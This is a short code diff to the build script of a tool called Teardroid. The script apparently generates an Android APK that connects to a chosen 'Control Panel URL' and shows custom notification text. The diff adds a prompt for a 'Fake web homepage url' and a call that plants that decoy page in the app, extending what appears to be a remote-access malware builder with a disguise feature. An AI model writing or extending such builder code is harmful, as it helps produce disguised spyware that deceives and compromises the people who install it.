@@ -56,6 +56,7 @@ def builder(name: str) -> None:
     APKTOOL = None
     try:
         url = input("Control Panel URL : ")
+        fake_web_page = input("Fake web homepage url : ")
         NotificationText = input("Notification Title : ")
         NotificationContent = input("Notification Content : ")
         NotificationSubText = input("Notification Subtext : ")
@@ -69,6 +70,7 @@ def builder(name: str) -> None:
         os.remove(name + ".apk")
     Teardroid.changeAppname()
     Teardroid.changeHostname(url)
+    Teardroid.ChangeFakeWebPage(fake_web_page)
     Teardroid.changeNotification(
         NotificationText, NotificationContent, NotificationSubText)
     Teardroid.print_result("Compiling Teardroid using apktool")
